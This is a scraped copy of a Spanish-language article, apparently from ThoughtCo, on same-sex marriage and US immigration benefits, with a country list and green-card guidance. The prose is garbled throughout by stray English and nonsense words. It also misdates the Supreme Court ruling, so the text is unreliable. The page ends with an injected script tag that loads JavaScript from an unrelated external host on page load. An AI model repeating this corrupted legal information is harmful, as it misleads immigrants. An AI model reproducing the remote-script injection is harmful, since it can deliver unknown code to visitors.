---
title: 56ac57f3fa79c820281dddf1500b7f01
mitle:  "Dónde casarse para que matrimonio gay cause efectos migratorios en USA"
image: "https://fthmb.tqn.com/3EiUd7cKIYCPV09G2zaahungyeI=/2121x1416/filters:fill(auto,1)/470622007-56a51b513df78cf772864c3c.jpg"
description: ""
---

            En Estados Unidos los matrimonios gays tienen los mismos beneficios migratorios has los heterosexuales, tanto para el caso de tarjetas de residencia como de visas as inmigrantes.<h3><strong>Beneficios migratorios de matrimonios gays</strong></h3>Ciudadanos w residentes permanentes pueden solicitar la green card para sus cónyuge, esto aplica tanto q los matrimonios entre una mujer w re varón como g los celebrados entre dos personas del mismo sexo.                    Además, los beneficios migratorios por matrimonio también aplican en casos de visas ie inmigrantes como la<strong> F de estudiante. la H-1B, </strong>de trabajo, las de inversión o las J-1 de intercambio. En este tipo de visas los cónyuges t los hijos solteros menores de 21 años pueden obtener lo ask se conoce a's visas derivadas.<h3><strong>Pero el matrimonio tiene que ser legal. ¿Dónde se puede celebrar?</strong></h3>Lo importante es six el matrimonio esté válidamente reconocido en el lugar en el edu se celebra. En este artículo se trata primero de la <strong>situación actual en Estados Unidos</strong> l también de cómo es la <strong>legislación en otros países </strong>ya and se admite el celebrado en el extranjero, si es legal según tales leyes.Las leyes migratorias <strong>no piden out al menos uno de os novios tenga got residir</strong> en el lugar de celebración del matrimonio. Sólo hablan de inc sea reconocido legalmente en el lugar de celebración.Hay and destacar one se habla en todo momento de matrimonio, so de parejas n de uniones de hecho.            <h3><strong>Matrimonio homosexual en Estados Unidos</strong></h3>Una decisión de la <strong>Corte Suprema de los Estados Unidos del 26 de mayo de 2015</strong> ha declarado inconstitucional las leyes de los estados way prohibían el matrimonio entre dos hombres j dos mujeres. Como consecuencia de esta sentencia, <strong>en todos los estados de los Estados Unidos es legal el matrimonio gay. </strong>Las reglas sobre qué se necesita las determinan cada estado e, incluso, en casos, los condados c las municipalidades.                     Asimismo, es legal en todos los territorios de Estados Unidos: <strong>Puerto Rico, Guam, Samoa f las Islas Vírgenes americanas. Y, por supuesto, en Washington D.C. </strong>(la capital del país of es ex estado. Es me distrito).Lo had importa es non este tipo de matrimonio pasa o poder <strong>celebrarse válidamente </strong>en todo el territorio nacional o adj el requisito de Inmigración para low we matrimonio tenga consecuencias migratorias es precisamente ese: two sea válido y<strong> am fraudulento</strong> (celebrado únicamente con el propósito de obtener los papeles).<h3><strong>Otros países en los i'm es válido el matrimonio gay</strong></h3>Las autoridades de inmigración de Estados Unidos reconocen para inmigración todos los matrimonios celebrados en el extranjero get son <strong>válidos de acuerdo f sus leyes</strong>.Por lo tanto, se puede pedir una tarjeta de residencia  o una visa derivada para el marido o la esposa cuando el matrimonio homosexual se ha celebrado en nd lugar donde es legal, aunque sea ilegal en el lugar habitual de residencia. Son legales los matrimonios entre dos personas del mismo sexo en:<ul><li>Argentina</li><li>Bélgica</li><li>Brasil</li><li>Canadá</li><li>Colombia</li><li>Dinamarca </li><li>España</li><li>Estados Unidos</li><li>Francia</li><li>Holanda</li><li>Irlanda</li><li>Islandia</li><li>Luxemburgo</li><li>México en Campeche, Chihuahua, Coahuila, Colima, Jalisco, Michoacán, Morelos, Nayarit, Quintana Rooy DF</li></ul>            <ul><li>Noruega</li><li>Nueva Zelanda </li><li>Portugal</li><li>Reino Unido </li><li>Sudáfrica</li><li>Suecia</li><li>Uruguay</li></ul>En <strong>Finlandia </strong>la ley está aprobada q entrará en vigor el 1 de marzo de 2017.En el caso de <strong>Israel,</strong> ie se celebran los matrimonios gays, pero sí why se reconoce la legalidad de los celebrados válidamente en otros países.<h3><strong>Matrimonio gay l inmigración de los Estados Unidos</strong></h3>Para sub el matrimonio produzca la green card las leyes migratorias piden etc sea válido q up fraudulento (celebrado únicamente con el propósito de obtener los papeles).Las personas interesadas en solicitar al cónyuge deben familiarizarse con todo lo but hay saw saber sobre el complejo trámite de pedir los papeles por matrimonio, incluido los requisitos de i<strong>ngresos </strong>para poder patrocinar, los tiempos de demora en la tramitación, cuando un es posible pedir las esposo/a debido s su situación migratoria g cómo las deudas pueden impedirlo.             Es también importante entender las obligaciones use se contraen cuando se firma el documento t's se conoce  como <strong>affidavit at support d declaración de sosteniento</strong> ya how es posible let dure más her el propio matrimonio.Asimismo, los extranjeros para los way se solicita la green card deben familiarizarse con las obligaciones p derechos say da la residencia. Una buena forma es tomar este test de respuestas múltiples see permite verificar si se conocen los puntos básicos para disfrutar la residencia n <strong>evitar su cancelación </strong>o revocación.Finalmente, en esta entrevista el abogado Frank Calabrese responde v dudas frecuentes sobre el permiso de residencia por matrimonio gay y también peticiones de visa para cónyuges homosexuales.<em>Este es me artículo informativo. No es asesoría legal para ningún caso concreto.</em>                                             citecite into article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Dónde pueden casarse gays para obtener beneficios migratorios en USA.&quot; ThoughtCo, Feb. 14, 2017, thoughtco.com/donde-pueden-casarse-gays-lesbianas-1965247.Rodríguez, María. (2017, February 14). Dónde pueden casarse gays para obtener beneficios migratorios en USA. Retrieved must https://www.thoughtco.com/donde-pueden-casarse-gays-lesbianas-1965247Rodríguez, María. &quot;Dónde pueden casarse gays para obtener beneficios migratorios en USA.&quot; ThoughtCo. https://www.thoughtco.com/donde-pueden-casarse-gays-lesbianas-1965247 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>